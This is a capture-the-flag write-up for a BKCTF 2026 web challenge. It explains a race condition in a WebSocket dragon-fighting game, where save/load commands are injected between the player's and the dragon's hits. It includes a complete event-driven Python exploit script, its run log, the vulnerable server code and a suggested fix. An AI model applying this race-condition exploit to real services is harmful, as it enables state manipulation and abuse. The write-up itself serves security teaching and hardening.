# BKCTF 2026 — Be a Legend Writeup

**Category:** Web  
**Points:** ~300  
**Flag:** `bkctf{s4v3_5cumm1ng_but_c001}`

---

## What is this challenge?

We get a WebSocket endpoint. We connect to it and see this:

```
Connected to Dragon's Lair
Commands: STATS, FIGHT, SAVE, LOAD, RESET, QUIT
Player! Defeat the evil dragon to be a legend and claim the legendary flag!
```

We type `STATS`:

```
Player HP: 100 | ATK: 10
Dragon HP: 1,000 | ATK: 999
```

Cool. So we do 10 damage per hit. Dragon has 1000 HP. That is 100 hits to kill it.

Small problem: dragon does 999 damage per hit. We have 100 HP.

We die in one hit. Every time.

```
You engage the dragon in combat!
You hit the dragon for 10 damage. Dragon HP: 990
The dragon hits you for 999 damage. Your HP: -899
You have died. Game Over.
```

Normal people would give up here. We are not normal people.

---

## Reading the Source Code

We download the source. Inside `server.py` we find the combat logic:

```python
async def fight(websocket, state):
    await websocket.send("You engage the dragon in combat!")
    
    # Player hits first
    await asyncio.sleep(0.3)
    damage = min(state.player_atk, 50)
    state.dragon_hp -= damage
    await websocket.send(f"You hit the dragon for {damage} damage. Dragon HP: {state.dragon_hp}")
    
    # Dragon hits second
    await asyncio.sleep(0.3)
    state.player_hp -= state.dragon_atk
    await websocket.send(f"The dragon hits you for {state.dragon_atk} damage. Your HP: {state.player_hp}")
```

There is a **0.3 second gap** between the player hit and the dragon hit.

And the save/load functions:

```python
async def save_game(state):
    state.last_save = pickle.dumps(state)
    await websocket.send("Game saved.")

async def load_game(state):
    loaded = pickle.loads(state.last_save)
    state.__dict__.update(loaded.__dict__)
    await websocket.send("Game loaded.")
```

`SAVE` takes a snapshot of the current game state. `LOAD` restores it. Simple.

But there is **no timing check**. You can send `SAVE` and `LOAD` at any point — even during combat.

This is the vulnerability.

---

## The Idea

The combat flow is:

```
FIGHT sent
  → 0.3s pause
  → Player hits dragon       ← dragon HP drops here
  → 0.3s pause  
  → Dragon hits player       ← player dies here
```

What if we send `SAVE` right after the player hit, before the dragon hits?

```
FIGHT sent
  → Player hits dragon  (dragon HP: 990)
  → SAVE                (snapshot: dragon=990, player=100, alive=True)
  → Dragon hits player  (player HP: -899, dead)
  → LOAD                (restore: dragon=990, player=100, alive=True)
```

Dragon lost 10 HP. We are back to full health. Repeat 100 times. Dragon dies.

Sounds simple. But there is a catch — the timing window is only ~0.3 seconds. We need to catch the exact moment between player hit and dragon hit.

---

## The Exploit

We wrote a Python script using `websocket-client`. The key insight: instead of guessing timing with `sleep()`, we react to the actual server messages.

**Event-driven approach:**

- When we see `"You hit the dragon for"` → immediately send `SAVE`
- When we see `"The dragon hits you for"` → immediately send `LOAD`
- When we see `"Game loaded."` → wait 0.3s then send `FIGHT` again

```python
import websocket
import threading
import time
import re

TARGET = "wss://be-a-legend-XXXX.instancer.batmans.kitchen/ws"

dragon_hp = 1000
in_combat = False
cycle = 0

def on_message(ws, message):
    global dragon_hp, in_combat, cycle

    print(f"  << {message}")

    # Track dragon HP
    m = re.search(r"Dragon HP:\s*([\d,]+)", message)
    if m:
        dragon_hp = int(m.group(1).replace(",", ""))

    # Player hit the dragon → SAVE immediately
    if "You hit the dragon for" in message and in_combat:
        ws.send("SAVE")

    # Dragon hit the player → LOAD immediately  
    if "The dragon hits you for" in message and in_combat:
        ws.send("LOAD")
        in_combat = False

    # Game loaded → start next fight
    if "Game loaded." in message:
        def next_fight():
            time.sleep(0.3)
            global cycle, in_combat
            if dragon_hp > 0:
                cycle += 1
                print(f"\n--- Cycle {cycle} | Dragon HP: {dragon_hp} ---")
                in_combat = True
                ws.send("FIGHT")
        threading.Thread(target=next_fight, daemon=True).start()

    # Flag check
    if "bkctf{" in message:
        print(f"\n FLAG: {message}")

def on_open(ws):
    def start():
        global cycle, in_combat
        time.sleep(0.5)
        ws.send("STATS")
        time.sleep(0.5)
        cycle = 1
        in_combat = True
        print(f"\n--- Cycle {cycle} | Dragon HP: {dragon_hp} ---")
        ws.send("FIGHT")
    threading.Thread(target=start, daemon=True).start()

ws_app = websocket.WebSocketApp(TARGET, on_open=on_open, on_message=on_message)
ws_app.run_forever()
```

We run it and watch:

```
--- Cycle 1 | Dragon HP: 1000 ---
  << You hit the dragon for 10 damage. Dragon HP: 990
  << Game saved.
  << The dragon hits you for 999 damage. Your HP: -899
  << Game loaded.
--- Cycle 2 | Dragon HP: 990 ---
  << You hit the dragon for 10 damage. Dragon HP: 980
  << Game saved.
  ...
--- Cycle 100 | Dragon HP: 10 ---
  << You hit the dragon for 10 damage. Dragon HP: 0
  << The dragon collapses in defeat!
  << FLAG: bkctf{s4v3_5cumm1ng_but_c001}
```

100 cycles. Dragon dead. Flag acquired.

---

## Why Did This Work?

The server processes commands in the order it receives them. When we send `SAVE` fast enough after seeing the player hit message, the server saves a state where:

- Dragon HP is already reduced
- Player HP is still 100
- Player is alive

Then when the dragon hits and kills us, `LOAD` instantly restores the good state. The dragon's damage never sticks.

This is called a **race condition** — we are racing against the server's own timer to inject commands between two operations that were supposed to happen atomically.

---

## How to Fix It

The fix is simple — do not allow `SAVE` and `LOAD` during active combat:

```python
async def save_game(state):
    if state.in_combat:
        await websocket.send("Cannot save during combat!")
        return
    state.last_save = pickle.dumps(state)
    await websocket.send("Game saved.")
```

Or even simpler — save and load only outside of combat, validated server-side. Never trust the client to call things at the right time.

If the game state is managed entirely server-side with proper locks around combat sequences, this attack becomes impossible. The player should not be able to inject any command between the player hit and dragon hit steps.

---

## Lesson

> Just because two operations happen 0.3 seconds apart does not mean they are safe.  
> Any gap between operations is a window for attack.

If critical state changes are not atomic — meaning they can be interrupted — an attacker will find the gap and exploit it. This applies to games, banking systems, inventory management — anywhere state is updated in steps.

---
![lesson](lesson.gif)
*Written for BKCTF 2026*
